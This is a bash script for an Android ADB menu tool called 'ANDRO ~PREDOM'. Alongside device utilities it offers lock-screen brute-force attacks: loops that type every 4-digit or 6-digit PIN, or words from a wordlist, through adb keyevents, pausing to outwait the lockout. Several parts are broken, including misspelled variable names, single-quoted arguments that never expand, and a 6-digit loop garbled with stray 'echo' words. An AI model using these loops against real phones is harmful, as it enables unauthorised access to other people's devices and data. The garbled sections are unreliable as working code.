#!/usr/bin/env bash
PATH=/bin:/usr/bin:

NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
echo -e "==== ${PURPLE}ANDRO${NONE} ${RED}~PREDOM${NONE} ===="
echo -e " 
${PURPLE} █████  ███    ██ ██████  ██████   ██████  ██ ██████ ${NONE}${RED}     ██████  ██████  ███████ ██████   ██████  ███    ███${NONE} 
${PURPLE}██   ██ ████   ██ ██   ██ ██   ██ ██    ██ ██ ██   ██${NONE}${RED}     ██   ██ ██   ██ ██      ██   ██ ██    ██ ████  ████${NONE} 
${PURPLE}███████ ██ ██  ██ ██   ██ ██████  ██    ██ ██ ██   ██${NONE}${RED}     ██████  ██████  █████   ██   ██ ██    ██ ██ ████ ██${NONE} 
${PURPLE}██   ██ ██  ██ ██ ██   ██ ██   ██ ██    ██ ██ ██   ██${NONE}${RED}     ██      ██   ██ ██      ██   ██ ██    ██ ██  ██  ██${NONE} 
${PURPLE}██   ██ ██   ████ ██████  ██   ██  ██████  ██ ██████ ${NONE}${RED}     ██      ██   ██ ███████ ██████   ██████  ██      ██${NONE}"
echo -e "**** ${BOLD}Developer${NONE}: ${UNDERLINE}${CYAN}Dev. Gautam Kumar${NONE} ***"
echo $(adb devices)
read -p "Continue? (1/2) :" select
echo $select
if [[ "$select" -eq 1 ]]; then
echo -e "${RED}Thanks for using${NONE}${PURPLE} ANDRO${NONE} ${RED}~PREDOM${NONE}";

elif [[ "$select" -eq 2 ]]; then
echo -e "${WHITE}Nice to hear that...${NONE}"
echo -e "${UNDERLINE}=== Options ===${NONE}"
echo -e "${YELLOW}1. Toggle wireless mode                 10. Edit/See battery level${NONE}"
echo -e "${RED}2. Kill server                          11. Reset battery level${NONE}"
echo -e "${YELLOW}3. Start server                         12. Open Camera${NONE}"
echo -e "${RED}4. See running packages                 13. Lock Device ${NONE}"
echo -e "${YELLOW}5. Enter shell                          14. Brute Android Pin Attack - 4 digits${NONE}"
echo -e "${RED}6. Reboot mdevice                       15. Brute Android Pin Attack - 6 digits${NONE}"
echo -e "${YELLOW}7. See android version                  16. Brute Android Password Attack - word${NONE}"
echo -e "${RED}8. Uninstall an application             17. Get Screenshot directly to CWD '$(pwd)'${NONE}"
echo -e "${YELLOW}9. Send SMS / make a call               18. Force stop an application${NONE}${YELLOW}"
fi
read -p "$(whoami)@andropredom :~ " select
#toggle wirless mode
if [[ "$select" -eq 1 ]]; then
echo "Switching to wireless mode..."
echo $(adb tcpip 5555)
echo $(adb connect `adb shell ip addr show wlan0  | grep 'inet ' | cut -d ' ' -f 6 | cut -d / -f 1`:5555)
elif [[ "$select" -eq 2 ]]; then
echo -e "${RED} Killing the server ${NONE}"
echo $(adb kill-server)
elif [[ "$select" -eq 3 ]]; then
echo -e "${CYAN} Killing the server ${NONE}"
echo $(adb start-server)
elif [[ "$select" -eq 4 ]]; then
echo -e "${CYAN} Fetching active apps ${NONE}"
echo $(adb shell dumpsys window windows | grep -E 'mFocusedApp'| cut -d / -f 1 | cut -d " " -f 7)
elif [[ "$select" -eq 5 ]]; then
echo -e "${GREEN} Entering Shell...${NONE}"
echo $(adb shell)
elif [[ "$select" -eq 6 ]]; then
echo -e "${GREEN} Rebooting device...${NONE}"
echo $(adb reboot)
elif [[ "$select" -eq 7 ]]; then
echo -e "${UNDERLINE} DEVICE DETAILS${NONE}"
manu=$(adb shell getprop ro.product.manufacturer)
model=$(adb shell getprop ro.product.model)
version=$(adb shell getprop ro.build.version.release )
sdk=$(adb shell getprop ro.build.version.sdk )
info=$(printf "%s %s %s (API %s)" "$manu" "$model" "$version" "$sdk")
echo "Info: " $info
echo "Manufacturer: " $manu
echo "Model: " $model
echo "Version: " $version
echo "Sdk: " $sdk
elif [[ "$select" -eq 8 ]];
 then
 read -p "Package name to uninstall: " select
 echo $(adb uninstall '$select')
elif [[ "$slect" -eq 9 ]];
 then
 read -p "What do you want to make? (sms:1/call:2): " select
 if [[ "$select" -eq 1 ]];
  then
  echo "To: "
  read -r number
  echo "Body: "
  read -r Body
  echo $(adb shell am start -a android.intent.action.SENDTO -d sms:'$number' --es sms_body '$Body' --ez exit_on_sent false)
 elif [[ "$select" -eq 2 ]];
  then
#adb shell am start -a android.intent.action.CALL -d tel:+972527300294 
  echo "To: "
  read -r number
  echo $(adb shell am start -a android.intent.action.CALL -d tel:'$number')
  fi
elif [[ "$select" -eq 10 ]];
 then
 read -p "What do you want to do? (See:0/Edit:1)" select
 if [[ "$select" -eq 0 ]];
  then
  echo $(adb shell dumpsys battery)
 elif [[ "$select" -eq 1 ]];
  then
  echo $(adb shell dumpsys battery set level)
  fi
elif [[ "$slect" -eq 11 ]];
 then
 echo -e "${CYAN} Resetting battery level to original...${NONE}"
 echo $(adb dumpsys battery reset)
elif [[ "$select" -eq 12 ]];
 then
 echo -e "${CYAN} Opening Camera...${NONE}"
 echo $(adb shell input keyevent 27)
elif [[ "$select" -eq 13 ]];
 then
 echo -e "${CYAN} Locking device...${NONE}"
 echo $(adb shell input keyevent 26)
elif [[ "$select" -eq 14 ]];
 then
 echo "Brute Pin 4 Digit"
 for i in {0000..9999};
  do
  echo "Try =>" $i

  for (( j=0; j<${#i}; j++ ));
   do
   echo $(adb shell input keyevent $((`echo ${i:$j:1}`+7)))
   done

      echo $(adb shell input keyevent 66)

  if ! (( `expr $i + 1` % 5 ));
   then
   echo $(adb shell input keyevent 66)
   echo "Delay Limit 30s"
   sleep 30
   echo $(adb shell input keyevent 82)
   echo $(adb shell input swipe 407 1211 378 85)
   fi  
  done
elif [[ "$select" -eq 15 ]];
 then
 echo "Brute Pin 6 Digit"
 for i in {000000..999999}; do
     echo "Try =>" echo $i

     for (( j=0; j<echo ${#i}; j++ )); 
     do
          echo $(adb shell input keyevent echo $((`echo echo ${i:echo $j:1}`+7)))
     done

      echo $(adb shell input keyevent 66)

     if ! (( `expr echo $i + 1` % 5 )); then
          echo $(adb shell input keyevent 66)
         echo "Delay Limit 30s"
          secs=echo $((1 * 30))
         while [ echo $secs -gt 0 ]; do
             echo -ne "echo $secs\033[0K\r"
             sleep 1
             : echo $((secs--))
         done

          sleep 30
          echo $(adb shell input keyevent 82)
          echo $(adb shell input swipe 407 1211 378 85)
     fi
 done
elif [[ "$select" -eq 16 ]];
 then 
 
 echo $(adb shell input keyevent 82)
 echo "Brute LockScreen Using Wordlist"
 read -p "list -> " files
 for i in `cat $files`; do
     echo "Try =>" $i

     for (( j=0; j<${#i}; j++ )); do
         echo $(adb shell input keyevent $((`echo ${i:$j:1}`+7)))
     done

     echo $(adb shell input keyevent 66)

     if ! (( `expr $i + 1` % 5 )); then
         echo $(adb shell input keyevent 66)
         echo "Delay Limit 30s"
         secs=$((1 * 30))
         while [ $secs -gt 0 ]; do
             echo -ne "$secs\033[0K\r"
             sleep 1
             : $((secs--))
         done

         sleep 30
         echo $(adb shell input keyevent 82)
           cho $(adb shell input swipe 407 1211 378 85)
     fi
 done

fi
